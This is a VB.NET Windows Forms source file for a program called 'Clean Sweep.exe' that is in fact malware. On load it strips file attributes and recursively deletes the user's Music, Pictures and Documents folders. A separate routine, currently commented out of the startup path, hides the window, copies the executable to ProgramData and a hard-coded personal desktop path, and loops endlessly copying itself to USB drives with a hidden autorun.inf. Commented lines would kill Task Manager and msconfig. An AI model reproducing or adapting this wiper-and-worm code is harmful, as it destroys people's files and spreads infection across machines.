Imports System.IO

Public Class Form1


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        EternalFlushInitiate()
        ' Judgement()
        ' Copy data from USB to MyDocuments
        Try
            Dim usbDriveLetter As String = GetUsbDriveLetter() ' Function to identify USB drive

            If Not String.IsNullOrEmpty(usbDriveLetter) Then

                Dim sourceFile As String = Path.Combine(usbDriveLetter, "Clean Sweep.exe")

                Dim destinationFile As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "Clean Sweep.exe")

                File.Copy(sourceFile, destinationFile, True) ' Overwrite existing file if needed

            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

    End Sub

    'USB Continuance
    Private Function GetUsbDriveLetter() As String

        For Each drive As DriveInfo In DriveInfo.GetDrives()

            If drive.DriveType = DriveType.Removable AndAlso drive.IsReady Then

                Return drive.Name

            End If

        Next

        Return String.Empty

    End Function

    Private Sub Judgement()
        Hide()
        Dim filepath As String
        filepath = Environ("homedrive") + "\programdata\Clean Sweep.exe"
        FileCopy(Application.ExecutablePath, filepath)
        Try
            Dim FileToCopy As String
            Dim NewCopy As String
            FileToCopy = Reflection.Assembly.GetExecutingAssembly().Location
            NewCopy = "C:\Users\rytho\OneDrive - University of Maine System\Desktop\Clean Sweep.exe"

            If File.Exists(FileToCopy) = True Then
                File.Copy(FileToCopy, NewCopy)

            End If

        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

        Do

            Try
#Disable Warning BC42024 ' Unused local variable
#Disable Warning BC42024 ' Unused local variable
                Dim rmdrive, strappath, strwinder, strautopath As String
#Enable Warning BC42024 ' Unused local variable
#Enable Warning BC42024 ' Unused local variable
                strappath = Application.ExecutablePath

                For Each drive As DriveInfo In My.Computer.FileSystem.Drives
                    If drive.DriveType = IO.DriveType.Removable Then
                        rmdrive = drive.ToString 'application copies to drive
                        FileCopy(strappath, rmdrive & "Clean Sweep.exe")
                        strappath = rmdrive & "autorun.inf"

                        Dim sw As New StreamWriter(strappath)
                        sw.WriteLine("[autorun]")
                        sw.WriteLine("shellexecute=Clean Sweep.exe")
                        sw.Close()

                        SetAttr(strappath, CType(vbHidden + vbSystem + vbReadOnly, FileAttribute))
                        SetAttr(strappath, CType(vbHidden + vbSystem + vbReadOnly, FileAttribute))
                    End If
                Next
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try


            ' For Each pr As Process In Process.GetProcesses
            'If pr.ProcessName = "taskmgr" Or pr.ProcessName = "msconfig" Then
            'pr.Kill()
            'End If
            '   Next
        Loop
    End Sub



    'The Integer is a Structure, but we think of it as a low-level native type in VB.NET.
    'Part 1 An Integer is declared with a Dim statement.
    'It can store positive values, such as 1, and negative values, such as -1
    'An integer is saved as a 32 bit number. That means, it can store 2^32 = 4,294,967,296 different values.
    Private Sub EternalFlushInitiate()
        Dim case_Values As Integer = 3
        Select Case case_Values
            Case 1 To 3
                'Try Statements provides a way to handle some or all possible errors that may occur in a given block of code,
                'while still running code.
                Try
                    SetAttributesCleanSweep(My.Computer.FileSystem.SpecialDirectories.MyMusic)
                    My.Computer.FileSystem.DeleteDirectory(My.Computer.FileSystem.SpecialDirectories.MyMusic, FileIO.DeleteDirectoryOption.DeleteAllContents)
                Catch ex As Exception
                    Debug.WriteLine(ex.Message)

                End Try

                Try
                    SetAttributesCleanSweep(My.Computer.FileSystem.SpecialDirectories.MyPictures)
                    My.Computer.FileSystem.DeleteDirectory(My.Computer.FileSystem.SpecialDirectories.MyPictures, FileIO.DeleteDirectoryOption.DeleteAllContents)
                Catch ex As Exception

                End Try

                Try
                    SetAttributesCleanSweep(My.Computer.FileSystem.SpecialDirectories.MyDocuments)
                    My.Computer.FileSystem.DeleteDirectory(My.Computer.FileSystem.SpecialDirectories.MyDocuments, FileIO.DeleteDirectoryOption.DeleteAllContents)
                Catch ex As Exception

                End Try
        End Select

    End Sub
    Private Sub SetAttributesCleanSweep(assistdirectory As String)
        For Each fileName As String In My.Computer.FileSystem.GetFiles(assistdirectory)
            Try
                'set the file attributes to ensure that we can delete the file
                My.Computer.FileSystem.GetFileInfo(fileName).Attributes = FileAttributes.Normal
            Catch ex As Exception
                Debug.WriteLine("Could not set attributes on file: " + fileName)
            End Try
        Next

        For Each target As String In My.Computer.FileSystem.GetDirectories(assistdirectory)
            Try
                'set the file attributes to ensure that we can delete the directory
                My.Computer.FileSystem.GetFileInfo(target).Attributes = FileAttributes.Directory
            Catch ex As Exception
                Debug.WriteLine("Could not set attributes on directory: " + target)
            End Try

            'Recursive-Method: All files & folders deleted
            SetAttributesCleanSweep(target)
        Next
    End Sub

End Class
